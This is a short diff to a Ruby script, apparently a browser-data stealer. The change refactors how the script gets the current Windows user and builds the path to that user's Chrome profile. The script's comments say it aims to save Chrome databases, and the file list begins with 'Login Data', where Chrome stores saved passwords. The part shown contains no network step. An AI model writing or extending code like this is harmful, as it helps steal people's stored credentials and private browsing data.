@@ -50,13 +50,11 @@ end
 
 #Current User and Domain
 
-domanduser = `whoami`.split("\\")
-#puts 'current user\'s domain: ' + domanduser[0]
-#puts 'current user: ' + domanduser[1]
+domain, user = `whoami`.split("\\")
 
 #Let's save some files, especially chrome DBs:
 
-chrome_Path = "C:\\Users\\" + domanduser[1].chomp + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
+chrome_Path = "C:\\Users\\" + user.chomp + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
 
 chrome_FileNames = { # just uncomment what's not needed
   :chrome_LoginFileName => 'Login Data',
